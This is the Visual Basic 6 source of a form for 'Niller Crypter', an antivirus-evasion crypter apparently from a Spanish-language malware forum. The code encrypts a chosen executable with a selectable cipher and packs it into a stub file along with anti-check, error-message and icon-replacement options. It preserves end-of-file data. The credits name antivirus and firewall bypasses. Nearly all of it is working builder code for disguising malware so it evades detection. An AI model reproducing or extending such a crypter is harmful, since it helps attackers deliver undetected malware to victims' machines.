VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#13.0#0"; "COAABA~1.OCX"
Begin VB.Form Niller 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Niller Crypter - Indetectables.Net"
   ClientHeight    =   3210
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7140
   BeginProperty Font 
      Name            =   "Myriad Pro"
      Size            =   9
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00808080&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Niller.frx":0000
   ScaleHeight     =   3210
   ScaleWidth      =   7140
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton about 
      BackColor       =   &H00000000&
      Caption         =   "?"
      Height          =   375
      Left            =   6720
      TabIndex        =   8
      Top             =   0
      Width           =   495
   End
   Begin VB.CommandButton Generar 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Generar"
      Height          =   375
      Left            =   6120
      TabIndex        =   6
      Top             =   1200
      Width           =   855
   End
   Begin VB.TextBox pswdn 
      BackColor       =   &H00FFFFFF&
      ForeColor       =   &H00808080&
      Height          =   375
      Left            =   3960
      TabIndex        =   5
      Text            =   "//Niller//Crypter//"
      Top             =   1200
      Width           =   2055
   End
   Begin VB.CommandButton gon 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Encriptar"
      Height          =   375
      Left            =   2400
      TabIndex        =   3
      Top             =   2040
      Width           =   1095
   End
   Begin MSComDlg.CommonDialog Common 
      Left            =   6720
      Top             =   2760
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton opciones 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Opciones"
      Height          =   375
      Left            =   3960
      TabIndex        =   2
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CommandButton brws 
      BackColor       =   &H00FFFFFF&
      Caption         =   "..."
      Height          =   375
      Left            =   3240
      TabIndex        =   1
      Top             =   1200
      Width           =   495
   End
   Begin VB.TextBox rutan 
      Alignment       =   2  'Center
      Enabled         =   0   'False
      ForeColor       =   &H00808080&
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Text            =   "Archivo A Encriptar"
      Top             =   1200
      Width           =   3015
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Height          =   255
      Left            =   1080
      TabIndex        =   7
      Top             =   480
      Width           =   255
   End
   Begin XtremeSkinFramework.SkinFramework SF 
      Left            =   6840
      Top             =   2880
      _Version        =   851968
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
   End
   Begin VB.Label status 
      BackStyle       =   0  'Transparent
      Caption         =   "Estado:"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   0
      TabIndex        =   4
      Top             =   3000
      Width           =   7815
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   7200
      Y1              =   960
      Y2              =   960
   End
End
Attribute VB_Name = "Niller"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub about_Click()
MsgBox "Niller Crypter" & vbNewLine & _
"Programado en VB6 Por Niller" & vbNewLine & _
"Fecha: 04/01/10" & vbNewLine & _
"Creditos: -Skyweb07(iSpread)" & vbNewLine & _
"                -LuOpP(EOF-Data)" & vbNewLine & _
"                -Sanlegas(Avira Bypass)" & vbNewLine & _
"                -m3m0_11(Proccess Exist)" & vbNewLine & _
"                -black-killer01(Outpost Bypass)" & vbNewLine & _
"                -Todos los usuarios del Foro Indetectables" & vbNewLine & _
"                -A la web troyanosyvirus.com.ar", vbInformation, "About Niller Crypter"
End Sub

Sub Form_Load()
SF.LoadSkin App.Path & "\Skin.DLL", ""
SF.ApplyWindow Me.hWnd
    Dim objCBT As clsBoxT
    Set objCBT = New clsBoxT
    Me.Show
    DoEvents
objCBT.DoIT brws
objCBT.DoIT Generar
objCBT.DoIT opciones
objCBT.DoIT gon
objCBT.DoIT about
If ArchivoE.ArchivoE(App.Path & "\Niller.DLL") = False Then
status.Caption = "Estado:  Falta el archivo Niller.DLL"
status.ForeColor = "&H000000C0"
Else
status.Caption = "Estado:  Listo Para Encriptar!"
End If
End Sub
Private Sub brws_Click()
With Common
.DialogTitle = "Elija un archivo a encriptar"
.Filter = "Aplicaciones|*.exe"
.ShowOpen
If Not Common.Filename = vbNullString Then
rutan.Text = Common.Filename
End If
End With
End Sub

Private Sub Generar_Click()
Dim Matrix As String
  
 Randomize Timer
  For x = 1 To Val(36)
   Matrix = Matrix & Chr(CLng(58 * Rnd + 1) + 64)
  Next x
  
pswdn.Text = Matrix
 status.Caption = "Estado: Password Generado!"
 status.ForeColor = "&H00000000"
End Sub

Private Sub gon_Click()
Dim ruta As String, Niller As String, Polifemo As String, Sanlegas As String, Encriptacion As String, EofData As String

If ArchivoE.ArchivoE(App.Path & "\Niller.DLL") = False Then
MsgBox "No se puede encriptar sin Niller.DLL!", vbCritical, Me.Caption
status.Caption = "Estado: Falta el Stub!"
status.ForeColor = "&H000000FF"
Else

If rutan.Text = vbNullString Then
MsgBox "Debes seleccionar un archivo a encriptar", vbExclamation
Else

Open App.Path & "\Niller.DLL" For Binary As #1
Polifemo = Space(LOF(1))
Get #1, , Polifemo
Close #1

Open rutan.Text For Binary As #1
Niller = Space(LOF(1))
Get #1, , Niller
Close #1

With Common
.DialogTitle = "Guardar Archivo..."
.Filter = "Aplicaciones|*.exe"
.ShowSave
End With

If opc.e0.Value = True Then
Dim enc0 As New clsRC4
Niller = enc0.EncryptString(Niller, pswdn.Text)
Encriptacion = "1"
GoTo Colon
End If

If opc.e1.Value = True Then
Dim enc1 As New clsSimpleXOR
Niller = enc1.EncryptString(Niller, pswdn.Text)
Encriptacion = "2"
GoTo Colon
End If

If opc.e2.Value = True Then
Dim enc2 As New clsSkipjack
Niller = enc2.EncryptString(Niller, pswdn.Text)
Encriptacion = "3"
GoTo Colon
End If

If opc.e3.Value = True Then
Dim enc3 As New clsGost
Niller = enc3.EncryptString(Niller, pswdn.Text)
Encriptacion = "4"
GoTo Colon
End If

If opc.e4.Value = True Then
Dim enc4 As New clsCryptAPI
Niller = enc4.EncryptString(Niller, pswdn.Text)
Encriptacion = "5"
GoTo Colon
End If

If opc.e5.Value = True Then
Dim enc5 As New clsDES
Niller = enc5.EncryptString(Niller, pswdn.Text)
Encriptacion = "6"
GoTo Colon
End If

If opc.e6.Value = True Then
Dim enc6 As New clsTEA
Niller = enc6.EncryptString(Niller, pswdn.Text)
Encriptacion = "7"
GoTo Colon
End If

If opc.e7.Value = True Then
Dim enc7 As New clsTwofish
Niller = enc7.EncryptString(Niller, pswdn.Text)
Encriptacion = "8"
GoTo Colon
End If

If opc.e8.Value = True Then
Dim enc8 As New clsBlowfish
Niller = enc8.EncryptString(Niller, pswdn.Text)
Encriptacion = "9"
GoTo Colon
End If

If opc.e9.Value = True Then
Dim enc9 As New clsSerpent
Niller = enc9.EncryptString(Niller, pswdn.Text)
Encriptacion = "10"
GoTo Colon
End If

Exit Sub

Colon:
If Not Common.Filename = vbNullString Then

Open Common.Filename For Binary As #1
Put #1, , Polifemo & "//Niller||Crypter\\" & Niller & "//Niller||Crypter\\" & Encriptacion & "//Niller||Crypter\\" & pswdn.Text & "//Niller||Crypter\\"
Put #1, , vbNullString & "//Niller||Error\\" & opc.errorusechk.Value & "//Niller||Error\\" & opc.titmsg.Text & "//Niller||Error\\" & opc.msg.Text & "//Niller||Error\\" & opc.msgnumber.Text & "//Niller||Error\\"
Put #1, , vbNullString & "//Niller||Opciones\\" & opc.anticheckn(0) & "//Niller||Opciones\\" & opc.anticheckn(1) & "//Niller||Opciones\\" & opc.anticheckn(2) & "//Niller||Opciones\\" & opc.anticheckn(3) & "//Niller||Opciones\\" & opc.anticheckn(4) & "//Niller||Opciones\\" & opc.anticheckn(5) & "//Niller||Opciones\\" & opc.anticheckn(6) & "//Niller||Opciones\\" & opc.anticheckn(7) & "//Niller||Opciones\\" & opc.anticheckn(8) & "//Niller||Opciones\\" & opc.anticheckn(9) & "//Niller||Opciones\\"
Put #1, , opc.d0.Value & "//Niller||Opciones\\" & opc.d1.Value & "//Niller||Opciones\\" & opc.d2.Value & "//Niller||Opciones\\" & opc.d3.Value & "//Niller||Opciones\\" & opc.d4.Value & "//Niller||Opciones\\" & opc.d5.Value & "//Niller||Opciones\\" & opc.f0.Value & "//Niller||Opciones\\" & opc.f1.Value & "//Niller||Opciones\\" & opc.f2.Value & "//Niller||Opciones\\"
Close #1

EofData = ReadEOFData(rutan.Text)
Call WriteEOFData(Common.Filename, EofData)
MsgBox "Archivo Encriptado con exito!", vbInformation, "Niller Crypter"
status.Caption = "Su archivo se encripto con exito!"
End If
End If
If opc.iconcheckn.Value = vbChecked Then
Call ReplaceIcons(opc.icontxt.Text, Common.Filename, Err)
End If
End If
End Sub

Private Sub Label1_Click()
MsgBox "Easter EGG , Como te gusta andar tocando ehh xD", vbInformation, Me.Caption
End Sub

Private Sub opciones_Click()
opc.Show
End Sub

